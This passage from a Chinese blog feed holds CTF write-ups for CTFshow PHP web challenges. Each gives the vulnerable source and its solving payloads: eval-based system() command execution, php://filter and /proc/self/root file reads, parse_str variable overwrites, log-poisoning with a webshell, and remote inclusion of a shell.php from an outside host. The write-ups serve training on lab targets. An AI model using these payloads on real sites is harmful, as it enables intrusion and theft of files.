class="line">POST=</span><br><span class="line"><span class="variable">$flag</span>=</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/00ef93f8d3424d479e51181c07ba93b4" alt="image-20211004171331651"></p><h4 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h4><p><img src="https://s1.vika.cn/space/2023/02/22/02c22c67d8c640eeb0c0ae2eb701857e" alt="image-20211004202114537"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/51e49e86f8b3472baa0ba9c8e422aee7" alt="image-20211004202601966"></p><p><img src="https://s1.vika.cn/space/2023/02/22/83942798034a4379941aa6e8b90b0c48" alt="image-20211004201959707"></p><h4 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ereg()</code> 函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false。搜索对于字母字符是区分大小写的<br> <code>strrev()</code> 函数反转字符串。<br> <code>%00</code>可以截断<code>ereg()</code>函数的搜索，正则表达式只会匹配%00之前的内容。<code>0x36d</code>的十进制为<code>877</code>，素以payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=a%00778</span><br></pre></td></tr></table></figure><h4 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实就是初始化一个<code>$v1</code>类，<code>$v2()</code>是传入这个类的参数，那么<code>$v1</code>是一个任意内置类。</p><p>也就是初始化一个<code>mysqli</code>类，但是实际上这个类的初始化时候传参不止这一个，所以是初始化失败的，但是由于其内部有魔术方法<code>__toString</code>：<br> 如果类定义了toString方法，就能在测试时，echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。<br> 这时候就可以echo出来了。<br> 同样内部类<code>Exception</code>也是可以的，这个类会把传入的参数输出出来，也是由<code>__toString</code>方法的，</p><p>因为只要有字母就行，所以利用PHP已有的类闭合一下，然后构造命令执行即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?v1=mysqli&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br><span class="line">?v1=Exception();system(&quot;ls&quot;);//&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br><span class="line">?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);//&amp;v2=a</span><br></pre></td></tr></table></figure><p>中间那个，可以不闭合的原理就是因为先执行的system，然后才报的错。你可以理解成<code>phpinfo(system(&quot;ls&quot;));</code>，先执行的system。</p><p>关于异常处理类可以参考<a href="https://links.jianshu.com/go?to=http://c.biancheng.net/view/6253.html">http://c.biancheng.net/view/6253.html</a></p><h4 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h4><p><img src="https://s1.vika.cn/space/2023/02/22/0610ba42c46f4c08b9ce97ff214fe649" alt="image-20211026164444466"></p><p><img src="https://s1.vika.cn/space/2023/02/22/2493795154a842fc82c9f8a1a089ae85" alt="image-20211026164559370"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure><p>这道题用上面两个方法就不行了，因为这里将括号等符号全过滤了，这道题看了官方的提示，考察的是PHP的内置类FilesystemIterator</p><p>先简单了解一下这个类的作用</p><blockquote><p>PHP使用FilesystemIterator迭代器遍历目录</p><p>主要是遍历功能</p></blockquote><p><img src="https://s1.vika.cn/space/2023/02/22/39b9ed24148343108d56e4c8aaa02b51" alt="image-20211026165058978"></p><p>所以我们只需要再得到一个点或者路径就可以查看当前目录下的文件，得到一个&#x2F;查看根目录下的文件。php中的getcwd()可以帮到我们这个忙。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getcwd</span>()</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line"><span class="title function_ invoke__">getcwd</span>(<span class="keyword">void</span>):<span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>题目的话有个缺陷，如果flag所在的文件不是排在第一位的话，我们可能就没有办法得到flag。因为getcwd只能读取当前目录。</p><h4 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h4><p>考察点：php超全局变量$GLOBALS的使用</p><p><img src="https://s1.vika.cn/space/2023/02/22/f0ef22e5b0954efbbfe65a4fd9028569" alt="image-20211026174616113"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS — 引用全局作用域中可用的全部变量</span><br><span class="line">一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/ef2983af38604870abe2727fb4764933" alt="image-20211026174704294"></p><p>所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出.<br> <code>payload: ?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;<span class="comment">#is_file检查是否符合文件格式</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常明显就是文件包含</p><p>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。<br>可以直接用不带任何过滤器的filter伪协议<br><code>payload:file=php://filter/resource=flag.php</code><br>也可以用一些没有过滤掉的编码方式和转换方式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.%2562ase64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment"># %25经url编码是%，%62是b</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line"><span class="comment"># Quoted-printable编码</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/3334e546ee9f480faa0c221c6a9bbe0d" alt="image-20211027214426941"></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/rootd多重绕过</span><br><span class="line">payload:</span><br><span class="line">file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#在linux中/proc/self/root是指向根目录/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#伪协议绕过</span></span><br><span class="line">?file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><p><img src="https://s1.vika.cn/space/2023/02/22/f90e04fb4842436a82b1177855ffac2b" alt="image-20211028210736009"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h4 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/75b71b83f83f4bc3aebeaf276960f910" alt="image-20211028215801732"></p><p>用脚本看过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/f119b1deb03848ffa20fccb85eb4d440" alt="image-20211028220451379"></p><p>测试得</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure><h4 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个难点是这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>PHP变量名由数字字母下划线组成，是没有.的</p><p>这里从大佬的文章了解到，GET或POST方式传进去的变量名,会自动将空格 + . [转换为_。</p><p>有一种特殊情况，特殊字符[GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了<br>如 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF[SHOW.COM=&gt;CTF_SHOW.COM</span><br></pre></td></tr></table></figure><p>$_SERVER[‘argv’];</p><p><img src="https://s1.vika.cn/space/2023/02/22/b7309d464ee945249ab82db94ee27e0d" alt="image-20211029155625349"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、cli模式（命令行）下</span><br><span class="line">    第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class="line">2、web网页模式下</span><br><span class="line">    在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[&#x27;argv&#x27;]才会有效果</span><br><span class="line">    这时候的$_SERVER[&#x27;argv&#x27;][0] = $_SERVER[&#x27;QUERY_STRING&#x27;]</span><br><span class="line">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure><p>在网页模式下运行的，<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>也就是$a[0]&#x3D; $_SERVER[‘QUERY_STRING’]，这时候只要通过 eval(“$c”.”;”);将$fl0g赋值flag_give_me就可以了</p><p><img src="https://s1.vika.cn/space/2023/02/22/e384ef6f0c194850a64166bfe13b274f" alt="image-20211029153903536"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">get: a=1+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line"></span><br><span class="line">?$fl0g=flag_give_me;</span><br><span class="line">DATA:</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF&amp;Web </tag>
            
            <tag> PHP特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow刷题-Web(4-14)</title>
      <link href="/post/d77ca5d926244e0294ae1d4d30b49579/"/>
      <url>/post/d77ca5d926244e0294ae1d4d30b49579/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录以前刷过的CTF题</p><h3 id="web4-文件包含-前言"><a href="#web4-文件包含-前言" class="headerlink" title="web4(文件包含)前言"></a>web4(文件包含)前言</h3><p>一、包含日志，将木马写在日志里面，再蚁剑连接</p><p><img src="https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579" alt="image-20210923220406359"></p><p><img src="https://s1.vika.cn/space/2023/02/22/c5c49619673740b9b5051ae08976d690" alt="image-20230222173344239"></p><p>二、远程文件包含</p><p>重新开启一个靶机环境</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://b297bb10-8978-4c85-a1cc-027ebb8a9015.chall.ctf.show/?url=http://xxx.xxx.xxx.xxx/shell.php</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/c8e452549b78437595dc2c2e18768872" alt="image-20230222173439804"></p><h3 id="web5（md5弱比较）"><a href="#web5（md5弱比较）" class="headerlink" title="web5（md5弱比较）"></a>web5（md5弱比较）</h3><p><img src="https://s1.vika.cn/space/2023/02/22/f53a57a19863439da81a2adce7386fe7" alt="image-20210923224935827"></p><p>ctype_alpha — 做纯字符检测，检查是否是字母</p><h3 id="web6（过滤空格的sql）"><a href="#web6（过滤空格的sql）" class="headerlink" title="web6（过滤空格的sql）"></a>web6（过滤空格的sql）</h3><p>fuzz得空格被过滤</p><p><img src="https://s1.vika.cn/space/2023/02/22/4d52508b60b94a8cb5f8ac68b4114fe0" 